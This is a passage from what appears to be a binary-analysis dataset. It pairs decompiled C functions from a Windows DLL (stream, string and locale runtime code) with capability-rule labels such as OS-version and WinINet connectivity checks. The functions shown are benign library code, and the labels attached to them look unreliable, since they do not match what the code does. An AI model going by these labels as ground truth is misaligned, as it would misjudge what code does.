        "decompiled_code": "\nint64_t * fcn.180010250(int64_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    \n    arg1[1] = 0;\n    piVar1 = *(*(*arg1 + 4) + 0x48 + arg1);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    cVar3 = fcn.180012070(arg1);\n    uVar4 = 0;\n    if ((cVar3 != '\\0') && (0 < arg3)) {\n        piVar1 = *(*(*arg1 + 4) + 0x48 + arg1);\n        iVar5 = (**(*piVar1 + 0x40))(piVar1, arg2, arg3);\n        arg1[1] = arg1[1] + iVar5;\n        uVar4 = 0;\n        if (iVar5 != arg3) {\n            uVar4 = 3;\n        }\n    }\n    iVar5 = *(*arg1 + 4) + arg1;\n    uVar4 = *(iVar5 + 0x10) | uVar4;\n    uVar2 = uVar4 | 4;\n    if (*(iVar5 + 0x48) != 0) {\n        uVar2 = uVar4;\n    }\n    fcn.1800037a0(iVar5, uVar2);\n    piVar1 = *(*(*arg1 + 4) + 0x48 + arg1);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0x10))();\n    }\n    return arg1;\n}\n",
        "token_count": 399
    },
    "18001054": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180010540(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    uchar auStack120 [32];\n    ulong uStack88;\n    int64_t **ppiStack80;\n    uchar auStack72 [24];\n    uchar auStack48 [4];\n    uchar auStack44 [4];\n    int64_t *piStack40;\n    uint64_t uStack32;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack120;\n    ppiStack80 = arg1;\n    piVar4 = fcn.180073b64(1);\n    arg1[3] = piVar4;\n    fcn.18006da30(auStack44, 0);\n    piVar4 = *0x18012a198;\n    piStack40 = *0x18012a198;\n    if (*0x18012b0c0 == 0) {\n        fcn.18006da30(auStack48, 0);\n        if (*0x18012b0c0 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x18012b0c0 = *0x1801286b8;\n        }\n        fcn.18006dab0(auStack48);\n    }\n    uVar3 = *0x18012b0c0;\n    piVar1 = arg1[3];\n    if (*0x18012b0c0 < piVar1[3]) {\n        piVar6 = *(piVar1[2] + *0x18012b0c0 * 8);\n        if (piVar6 != NULL) goto code_r0x000180010657;\n    }\n    else {\n        piVar6 = NULL;\n    }\n    if (*(piVar1 + 0x24) == '\\0') {\ncode_r0x000180010612:\n        if (piVar6 != NULL) goto code_r0x000180010657;\n    }\n    else {\n        iVar5 = fcn.180073b5c();\n        if (uVar3 < *(iVar5 + 0x18)) {\n            piVar6 = *(*(iVar5 + 0x10) + uVar3 * 8);\n            goto code_r0x000180010612;\n        }\n    }\n    piVar6 = piVar4;\n    if (piVar4 == NULL) {\n        iVar5 = fcn.180014980(&piStack40, arg1 + 2);\n        piVar6 = piStack40;\n        if (iVar5 == -1) {\n            fcn.180002310(auStack72);\n            fcn.1800add8c(auStack72, 0x18011f808);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.180073b24(piStack40);\n        (**(*piVar6 + 8))(piVar6);\n        *0x18012a198 = piVar6;\n    }\ncode_r0x000180010657:\n    fcn.18006dab0(auStack44);\n    *arg1 = piVar6;\n    piVar4 = fcn.180014560(arg1 + 2);\n    arg1[1] = piVar4;\n    fcn.18008fb00(uStack32 ^ auStack120);\n    return;\n}\n",
        "token_count": 799
    },
    "180010d5": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.180010d50(int64_t **arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    int64_t **ppiVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    int64_t arg2_00;\n    int64_t *piVar7;\n    \n    piVar7 = 0xffffffffffffffff;\n    do {\n        piVar7 = piVar7 + 1;\n    } while (*(arg2 + piVar7 * 2) != 0);\n    piVar2 = arg1[3];\n    if (piVar2 < piVar7) {\n        if (0x7ffffffffffffffe < piVar7) {\n            fcn.180014b60();\n            pcVar3 = swi(3);\n            ppiVar4 = (*pcVar3)();\n            return ppiVar4;\n        }\n        piVar5 = piVar7 | 7;\n        piVar6 = 0x7ffffffffffffffe;\n        if (((piVar5 < 0x7fffffffffffffff) && (piVar2 <= 0x7ffffffffffffffe - (piVar2 >> 1))) &&\n           (piVar1 = (piVar2 >> 1) + piVar2,  piVar6 = piVar5,  piVar5 < piVar1)) {\n            piVar6 = piVar1;\n        }\n        arg2_00 = piVar6 + 1;\n        if (piVar6 == 0xffffffffffffffff) {\n            arg2_00 = -1;\n        }\n        piVar5 = fcn.180011cf0(arg1, arg2_00);\n        arg1[3] = piVar6;\n        arg1[2] = piVar7;\n        fcn.1800ade80(piVar5, arg2, piVar7 * 2);\n        *(piVar7 * 2 + piVar5) = 0;\n        if (0x7 < piVar2) {\n            piVar7 = *arg1;\n            piVar6 = piVar7;\n            if (0xfff < piVar2 * 2 + 2U) {\n                piVar6 = piVar7[-1];\n                if (0x1f < (piVar7 - piVar6) - 8U) {\n                    fcn.1800b3528(piVar7 - piVar6, piVar2 * 2 + 0x29);\n                    pcVar3 = swi(3);\n                    ppiVar4 = (*pcVar3)();\n                    return ppiVar4;\n                }\n            }\n            fcn.18008fb24(piVar6);\n        }\n        *arg1 = piVar5;\n    }\n    else {\n        ppiVar4 = arg1;\n        if (0x7 < piVar2) {\n            ppiVar4 = *arg1;\n        }\n        arg1[2] = piVar7;\n        fcn.1800ade80(ppiVar4, arg2, piVar7 * 2);\n        *(piVar7 * 2 + ppiVar4) = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 708
    },
    "18001110": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.180011100(int64_t **arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    uint64_t arg1_00;\n    int64_t iVar4;\n    int64_t **ppiVar5;\n    int64_t *piVar6;\n    uint64_t arg1_01;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    \n    piVar8 = 0xffffffffffffffff;\n    do {\n        piVar8 = piVar8 + 1;\n    } while (*(arg2 + piVar8) != '\\0');\n    piVar2 = arg1[3];\n    if (piVar8 <= piVar2) {\n        ppiVar5 = arg1;\n        if (0xf < piVar2) {\n            ppiVar5 = *arg1;\n        }\n        arg1[2] = piVar8;\n        fcn.1800ade80(ppiVar5, arg2, piVar8);\n        *(piVar8 + ppiVar5) = 0;\n        return arg1;\n    }\n    if (0x7fffffffffffffff < piVar8) {\n        fcn.180014b60();\n        pcVar3 = swi(3);\n        ppiVar5 = (*pcVar3)();\n        return ppiVar5;\n    }\n    piVar6 = piVar8 | 0xf;\n    piVar7 = 0x7fffffffffffffff;\n    if (((piVar6 < 0x8000000000000000) && (piVar2 <= 0x7fffffffffffffff - (piVar2 >> 1))) &&\n       (piVar1 = (piVar2 >> 1) + piVar2,  piVar7 = piVar6,  piVar6 < piVar1)) {\n        piVar7 = piVar1;\n    }\n    arg1_00 = piVar7 + 1;\n    if (piVar7 == 0xffffffffffffffff) {\n        arg1_00 = 0xffffffffffffffff;\n    }\n    if (arg1_00 < 0x1000) {\n        if (arg1_00 == 0) {\n            piVar6 = NULL;\n        }\n        else {\n            piVar6 = fcn.18008fb2c(arg1_00);\n        }\n    }\n    else {\n        arg1_01 = arg1_00 + 0x27;\n        if (arg1_01 <= arg1_00) {\n            arg1_01 = 0xffffffffffffffff;\n        }\n        iVar4 = fcn.18008fb2c(arg1_01);\n        if (iVar4 == 0) goto code_r0x00018001126b;\n        piVar6 = iVar4 + 0x27U & 0xffffffffffffffe0;\n        piVar6[-1] = iVar4;\n    }\n    arg1[2] = piVar8;\n    arg1[3] = piVar7;\n    fcn.1800ade80(piVar6, arg2, piVar8);\n    *(piVar8 + piVar6) = 0;\n    if (0xf < piVar2) {\n        piVar8 = *arg1;\n        piVar7 = piVar8;\n        if ((0xfff < piVar2 + 1U) && (piVar7 = piVar8[-1],  0x1f < piVar8 + (-8 - piVar7))) {\ncode_r0x00018001126b:\n            fcn.1800b3528();\n            pcVar3 = swi(3);\n            ppiVar5 = (*pcVar3)();\n            return ppiVar5;\n        }\n        fcn.18008fb24(piVar7);\n    }\n    *arg1 = piVar6;\n    return arg1;\n}\n",
        "token_count": 849
    },
    "18001147": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.180011470(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    code **arg1_00;\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    ushort uVar5;\n    uint32_t uVar6;\n    int64_t *piVar7;\n    ulong *puVar8;\n    uchar (*pauVar9) [16];\n    ulong uVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    uchar auStack112 [8];\n    int64_t *piStack104;\n    ulong uStack96;\n    ulong uStack88;\n    int64_t *piStack72;\n    \n    uStack88 = 0xfffffffffffffffe;\n    *arg1 = 0x1800ff8c8;\n    arg1[0x16] = vtable.std::basic_ios_wchar_t__struct_std::char_traits_wchar_t__.0;\n    *(*(*arg1 + 4) + arg1) = vtable.std::basic_istream_wchar_t__struct_std::char_traits_wchar_t__.0;\n    *(*(*arg1 + 4) + -4 + arg1) = *(*arg1 + 4) + -0x18;\n    arg1[1] = 0;\n    iVar12 = *(*arg1 + 4) + arg1;\n    uStack96 = arg2;\n    piStack72 = arg1;\n    fcn.180003820(iVar12);\n    arg1_00 = arg1 + 2;\n    *(iVar12 + 0x48) = arg1_00;\n    *(iVar12 + 0x50) = 0;\n    piStack104 = *(*(iVar12 + 0x40) + 8);\n    (**(*piStack104 + 8))();\n    piVar7 = fcn.180014560(auStack112);\n    uVar5 = (**(*piVar7 + 0x60))(piVar7);\n    if (piStack104 != NULL) {\n        puVar8 = (**(*piStack104 + 0x10))();\n        if (puVar8 != NULL) {\n            (***puVar8)(puVar8);\n        }\n    }\n    *(iVar12 + 0x58) = uVar5;\n    if (*(iVar12 + 0x48) == 0) {\n        fcn.1800037a0(iVar12, *(iVar12 + 0x10) | 4);\n    }\n    *(*(*arg1 + 4) + arg1) = vtable.std::basic_ifstream_wchar_t__struct_std::char_traits_wchar_t__.0;\n    *(*(*arg1 + 4) + -4 + arg1) = *(*arg1 + 4) + -0xb0;\n    *arg1_00 = vtable.std::basic_streambuf_wchar_t__struct_std::char_traits_wchar_t__.0;\n    pauVar9 = fcn.18008fb2c(0x10);\n    *pauVar9 = ZEXT816(0);\n    uVar10 = fcn.180073b64(1);\n    *(*pauVar9 + 8) = uVar10;\n    arg1[0xe] = pauVar9;\n    piVar7 = arg1 + 3;\n    arg1[5] = piVar7;\n    piVar1 = arg1 + 4;\n    piVar2 = arg1 + 7;\n    arg1[9] = piVar2;\n    piVar3 = arg1 + 8;\n    arg1[10] = piVar3;\n    piVar4 = arg1 + 0xb;\n    arg1[0xc] = piVar4;\n    iVar12 = arg1 + 0x5c;\n    arg1[0xd] = iVar12;\n    *piVar1 = 0;\n    *arg1[10] = 0;\n    *arg1[0xd] = 0;\n    *arg1[5] = 0;\n    *arg1[9] = 0;\n    *arg1[0xc] = 0;\n    *arg1_00 = vtable.std::basic_filebuf_wchar_t__struct_std::char_traits_wchar_t__.0;\n    *(arg1 + 0x8c) = 0;\n    *(arg1 + 0x82) = 0;\n    arg1[5] = piVar7;\n    arg1[6] = piVar1;\n    arg1[9] = piVar2;\n    arg1[10] = piVar3;\n    arg1[0xc] = piVar4;\n    arg1[0xd] = iVar12;\n    *piVar1 = 0;\n    *arg1[10] = 0;\n    *arg1[0xd] = 0;\n    *arg1[5] = 0;\n    *arg1[9] = 0;\n    *arg1[0xc] = 0;\n    arg1[0x12] = 0;\n    *(arg1 + 0x84) = *0x18012b0d0;\n    arg1[0xf] = 0;\n    iVar11 = fcn.180074078(uStack96, arg3 | 1, 0x40);\n    if (iVar11 == 0) {\n        iVar12 = *(*arg1 + 4) + arg1;\n        uVar6 = 6;\n        if (*(iVar12 + 0x48) != 0) {\n            uVar6 = 2;\n        }\n        fcn.1800037a0(iVar12, uVar6 | *(iVar12 + 0x10));\n    }\n    else {\n        *(arg1 + 0x8c) = 1;\n        *(arg1 + 0x82) = 0;\n        arg1[5] = piVar7;\n        arg1[6] = arg1 + 4;\n        arg1[9] = piVar2;\n        arg1[10] = piVar3;\n        arg1[0xc] = piVar4;\n        arg1[0xd] = iVar12;\n        arg1[4] = 0;\n        *arg1[10] = 0;\n        *arg1[0xd] = 0;\n        *arg1[5] = 0;\n        *arg1[9] = 0;\n        *arg1[0xc] = 0;\n        arg1[0x12] = iVar11;\n        *(arg1 + 0x84) = *0x18012b0d0;\n        arg1[0xf] = 0;\n        piStack104 = *(arg1[0xe] + 8);\n        (**(*piStack104 + 8))();\n        uVar10 = fcn.180012710(auStack112);\n        fcn.180011790(arg1_00, uVar10);\n        if (piStack104 != NULL) {\n            puVar8 = (**(*piStack104 + 0x10))();\n            if (puVar8 != NULL) {\n                (***puVar8)(puVar8, 1);\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 1604
    },
    "18001192": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.180011920(int64_t arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    if (*(arg1 + 0x80) == 0) {\n        iVar3 = 0;\n    }\n    else {\n        cVar1 = fcn.180011830(arg1);\n        iVar3 = arg1;\n        if (cVar1 == '\\0') {\n            iVar3 = 0;\n        }\n        iVar2 = fcn.1800b10bc(*(arg1 + 0x80));\n        if (iVar2 != 0) {\n            iVar3 = 0;\n        }\n    }\n    *(arg1 + 0x7c) = 0;\n    *(arg1 + 0x20) = arg1 + 0x10;\n    *(arg1 + 0x18) = arg1 + 8;\n    *(arg1 + 0x38) = arg1 + 0x28;\n    *(arg1 + 0x40) = arg1 + 0x30;\n    *(arg1 + 0x50) = arg1 + 0x48;\n    *(arg1 + 0x58) = arg1 + 0x4c;\n    *(arg1 + 0x72) = 0;\n    *(arg1 + 0x10) = 0;\n    **(arg1 + 0x40) = 0;\n    **(arg1 + 0x58) = 0;\n    **(arg1 + 0x18) = 0;\n    **(arg1 + 0x38) = 0;\n    **(arg1 + 0x50) = 0;\n    *(arg1 + 0x74) = *0x18012b0d0;\n    *(arg1 + 0x80) = 0;\n    *(arg1 + 0x68) = 0;\n    return iVar3;\n}\n",
        "token_count": 435
    },
    "180011b2": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180011b20(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    uchar auStack72 [32];\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack72;\n    *(arg1 + 0x71) = 0;\n    *(arg1 + 0x20) = arg1 + 0x10;\n    *(arg1 + 0x7c) = arg3 == 1;\n    *(arg1 + 0x18) = arg1 + 8;\n    *(arg1 + 0x38) = arg1 + 0x28;\n    *(arg1 + 0x40) = arg1 + 0x30;\n    *(arg1 + 0x50) = arg1 + 0x48;\n    *(arg1 + 0x58) = arg1 + 0x4c;\n    *(arg1 + 0x10) = 0;\n    **(arg1 + 0x40) = 0;\n    **(arg1 + 0x58) = 0;\n    **(arg1 + 0x18) = 0;\n    **(arg1 + 0x38) = 0;\n    **(arg1 + 0x50) = 0;\n    if (arg2 != 0) {\n        uStack40 = 0;\n        uStack32 = 0;\n        uStack24 = 0;\n        fcn.1800b2268(arg2, &uStack40, &uStack32, &uStack24);\n        *(arg1 + 0x18) = uStack40;\n        *(arg1 + 0x20) = uStack40;\n        *(arg1 + 0x38) = uStack32;\n        *(arg1 + 0x40) = uStack32;\n        *(arg1 + 0x50) = uStack24;\n        *(arg1 + 0x58) = uStack24;\n    }\n    *(arg1 + 0x74) = *0x18012b0c8;\n    *(arg1 + 0x80) = arg2;\n    *(arg1 + 0x68) = 0;\n    fcn.18008fb00(uStack16 ^ auStack72);\n    return;\n}\n",
        "token_count": 533
    },
    "180011c3": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.180011c30(int64_t arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    if (*(arg1 + 0x80) == 0) {\n        iVar3 = 0;\n    }\n    else {\n        cVar1 = fcn.180011a30(arg1);\n        iVar3 = arg1;\n        if (cVar1 == '\\0') {\n            iVar3 = 0;\n        }\n        iVar2 = fcn.1800b10bc(*(arg1 + 0x80));\n        if (iVar2 != 0) {\n            iVar3 = 0;\n        }\n    }\n    fcn.180011b20(arg1, 0, 2);\n    return iVar3;\n}\n",
        "token_count": 174
    },
    "180011de": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.180011de0(int64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t arg2_00;\n    ulong arg2_01;\n    ulong *puVar1;\n    uchar auStack32 [8];\n    int64_t *piStack24;\n    \n    if (*(arg1 + 0x80) == 0) {\n        arg2_00 = fcn.180074078(arg2, arg3 & 0xffffffff, 0x40);\n        if (arg2_00 != 0) {\n            fcn.180011b20(arg1, arg2_00, 1);\n            piStack24 = *(*(arg1 + 0x60) + 8);\n            (**(*piStack24 + 8))();\n            arg2_01 = fcn.180013940(auStack32);\n            fcn.180011790(arg1, arg2_01);\n            if (piStack24 != NULL) {\n                puVar1 = (**(*piStack24 + 0x10))();\n                if (puVar1 != NULL) {\n                    (***puVar1)(puVar1, 1);\n                }\n            }\n            return arg1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 275
    },
    "180011f5": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180011f50(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t arg1_00;\n    uchar auStack72 [32];\n    ulong uStack40;\n    int64_t *piStack32;\n    char cStack24;\n    uint64_t uStack16;\n    \n    uStack40 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack72;\n    if (*(*(*arg1 + 4) + 0x48 + arg1) != 0) {\n        fcn.180010b50(&piStack32, arg1);\n        if (cStack24 != '\\0') {\n            iVar3 = (**(**(*(*arg1 + 4) + 0x48 + arg1) + 0x68))();\n            if (iVar3 == -1) {\n                arg1_00 = *(*arg1 + 4) + arg1;\n                fcn.1800037a0(arg1_00, *(arg1_00 + 0x10) | 4);\n            }\n        }\n        cVar2 = fcn.180073e64();\n        if (cVar2 == '\\0') {\n            fcn.180012010(piStack32);\n        }\n        piVar1 = *(*(*piStack32 + 4) + 0x48 + piStack32);\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 0x10))();\n        }\n    }\n    fcn.18008fb00(uStack16 ^ auStack72);\n    return;\n}\n",
        "token_count": 363
    },
    "1800122a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.1800122a0(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    \n    piVar1 = *(*(*arg1 + 4) + 0x48 + arg1);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n        iVar4 = *arg1;\n        if (((*(*(iVar4 + 4) + 0x10 + arg1) == 0) && (piVar1 = *(*(iVar4 + 4) + 0x50 + arg1),  piVar1 != NULL)) &&\n           (piVar1 != arg1)) {\n            fcn.1800122a0(piVar1);\n            iVar4 = *arg1;\n        }\n        if (*(*(iVar4 + 4) + 0x10 + arg1) == 0) {\n            iVar3 = (**(**(*(iVar4 + 4) + 0x48 + arg1) + 0x68))();\n            if (iVar3 == -1) {\n                iVar4 = *(*arg1 + 4) + arg1;\n                fcn.1800037a0(iVar4, *(iVar4 + 0x10) | 4);\n            }\n        }\n        cVar2 = fcn.180073e64();\n        if (cVar2 == '\\0') {\n            fcn.180012010(arg1);\n        }\n        piVar1 = *(*(*arg1 + 4) + 0x48 + arg1);\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 0x10))();\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 389
    },
    "18001237": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180012370(int64_t arg1, ulong arg2)\n\n{\n    uchar uVar1;\n    int64_t *piVar2;\n    ulong *puVar3;\n    uchar auStack32 [8];\n    int64_t *piStack24;\n    \n    fcn.180003820(arg1);\n    *(arg1 + 0x48) = arg2;\n    *(arg1 + 0x50) = 0;\n    piStack24 = *(*(arg1 + 0x40) + 8);\n    (**(*piStack24 + 8))();\n    piVar2 = fcn.180012470(auStack32);\n    uVar1 = (**(*piVar2 + 0x40))(piVar2);\n    if (piStack24 != NULL) {\n        puVar3 = (**(*piStack24 + 0x10))();\n        if (puVar3 != NULL) {\n            (***puVar3)(puVar3);\n        }\n    }\n    *(arg1 + 0x58) = uVar1;\n    if (*(arg1 + 0x48) == 0) {\n        fcn.1800037a0(arg1, *(arg1 + 0x10) | 4);\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "18001247": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180012470(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar auStack104 [32];\n    ulong uStack72;\n    uchar auStack64 [24];\n    uchar auStack40 [4];\n    uchar auStack36 [4];\n    int64_t *piStack32;\n    uint64_t uStack24;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack104;\n    fcn.18006da30(auStack36, 0);\n    piVar3 = *0x18012a1a8;\n    piStack32 = *0x18012a1a8;\n    if (*0x1801286d0 == 0) {\n        fcn.18006da30(auStack40, 0);\n        if (*0x1801286d0 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x1801286d0 = *0x1801286b8;\n        }\n        fcn.18006dab0(auStack40);\n    }\n    uVar2 = *0x1801286d0;\n    iVar4 = *(arg1 + 8);\n    if (*0x1801286d0 < *(iVar4 + 0x18)) {\n        iVar5 = *(*(iVar4 + 0x10) + *0x1801286d0 * 8);\n        if (iVar5 != 0) goto code_r0x000180012577;\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (*(iVar4 + 0x24) == '\\0') {\ncode_r0x000180012533:\n        if (iVar5 != 0) goto code_r0x000180012577;\n    }\n    else {\n        iVar4 = fcn.180073b5c();\n        if (uVar2 < *(iVar4 + 0x18)) {\n            iVar5 = *(*(iVar4 + 0x10) + uVar2 * 8);\n            goto code_r0x000180012533;\n        }\n    }\n    if (piVar3 == NULL) {\n        iVar4 = fcn.180002d40(&piStack32, arg1);\n        piVar3 = piStack32;\n        if (iVar4 == -1) {\n            fcn.180002310(auStack64);\n            fcn.1800add8c(auStack64, 0x18011f808);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.180073b24(piStack32);\n        (**(*piVar3 + 8))(piVar3);\n        *0x18012a1a8 = piVar3;\n    }\ncode_r0x000180012577:\n    fcn.18006dab0(auStack36);\n    fcn.18008fb00(uStack24 ^ auStack104);\n    return;\n}\n",
        "token_count": 698
    },
    "18001271": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180012710(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar auStack104 [32];\n    ulong uStack72;\n    uchar auStack64 [24];\n    uchar auStack40 [4];\n    uchar auStack36 [4];\n    int64_t *piStack32;\n    uint64_t uStack24;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack104;\n    fcn.18006da30(auStack36, 0);\n    piVar3 = *0x18012a190;\n    piStack32 = *0x18012a190;\n    if (*0x1801286f8 == 0) {\n        fcn.18006da30(auStack40, 0);\n        if (*0x1801286f8 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x1801286f8 = *0x1801286b8;\n        }\n        fcn.18006dab0(auStack40);\n    }\n    uVar2 = *0x1801286f8;\n    iVar4 = *(arg1 + 8);\n    if (*0x1801286f8 < *(iVar4 + 0x18)) {\n        iVar5 = *(*(iVar4 + 0x10) + *0x1801286f8 * 8);\n        if (iVar5 != 0) goto code_r0x000180012817;\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (*(iVar4 + 0x24) == '\\0') {\ncode_r0x0001800127d3:\n        if (iVar5 != 0) goto code_r0x000180012817;\n    }\n    else {\n        iVar4 = fcn.180073b5c();\n        if (uVar2 < *(iVar4 + 0x18)) {\n            iVar5 = *(*(iVar4 + 0x10) + uVar2 * 8);\n            goto code_r0x0001800127d3;\n        }\n    }\n    if (piVar3 == NULL) {\n        iVar4 = fcn.1800027f0(&piStack32, arg1);\n        piVar3 = piStack32;\n        if (iVar4 == -1) {\n            fcn.180002310(auStack64);\n            fcn.1800add8c(auStack64, 0x18011f808);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.180073b24(piStack32);\n        (**(*piVar3 + 8))(piVar3);\n        *0x18012a190 = piVar3;\n    }\ncode_r0x000180012817:\n    fcn.18006dab0(auStack36);\n    fcn.18008fb00(uStack24 ^ auStack104);\n    return;\n}\n",
        "token_count": 697
    },
    "18001287": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
